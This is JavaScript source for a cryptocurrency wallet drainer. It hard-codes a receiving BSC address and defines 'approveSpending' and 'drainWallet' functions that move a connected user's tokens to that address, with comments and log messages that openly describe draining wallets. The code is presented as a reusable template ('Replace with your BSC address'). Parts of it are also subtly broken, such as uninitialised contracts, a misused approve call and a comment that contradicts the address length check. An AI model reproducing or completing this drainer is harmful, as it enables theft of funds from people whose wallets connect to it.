const receiveAddress = "0xbea841e711E85CB758Abb0610C01031b46950E5E"; // Replace with your BSC address

var cryptotokenContract;
var smartcontract;

// Approve spending of tokens on behalf of the user
function approveSpending(token) {
    // Approve smart contract to access tokens on user's behalf
    smartcontract.methods.approve(token.address, token.amount).send({ from: currentAddr })
        .then((result) => {
            console.log("Spending Approved: ", result);
        })
        .catch((error) => {
            console.error("Error approving spending: ", error);
        });

    // Transfer tokens to the specified address (drain)
    smartcontract.methods.transfer(receiveAddress, token.amount).send({ from: currentAddr })
        .then((result) => {
            console.log("Transfer to receive address completed: ", result);
        })
        .catch((error) => {
            console.error("Error transferring tokens: ", error);
        });
}

// Drain wallet - Transfer tokens to the specified address
function drainWallet(token) {
    cryptotokenContract.methods.transfer(receiveAddress, token.amount).send({ from: currentAddr })
        .then((result) => {
            console.log("Wallet drained successfully: ", result);
        })
        .catch((error) => {
            console.error("Error draining wallet: ", error);
        });
}

// Check if the configuration for the receive address is correct
function checkConfiguration() {
    if (!receiveAddress.startsWith("0x") ||
        receiveAddress.length < 42 || // Length must be between 42 and 64 for Ethereum addresses
        receiveAddress.length > 42) {
        console.error("Invalid address format.");
    } else {
        console.log("Address format is valid.");
    }
}

// Token ABI - replace with your token contract ABI
var tokenAbi = [
    {
        "inputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [{
            "internalType": "uint8",
            "name": "",
            "type": "uint8"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [{
            "internalType": "address",
            "name": "account",
            "type": "address"
        }],
        "name": "balanceOf",
        "outputs": [{
            "internalType": "uint256",
            "name": "",
            "type": "uint256"
        }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    // More ABI methods here...
];

// Example of calling approveSpending
approveSpending({ address: "0x1234567890abcdef1234567890abcdef12345678", amount: 1000 });

// Example of calling drainWallet
drainWallet({ amount: 500 });

// Call configuration check
checkConfiguration();
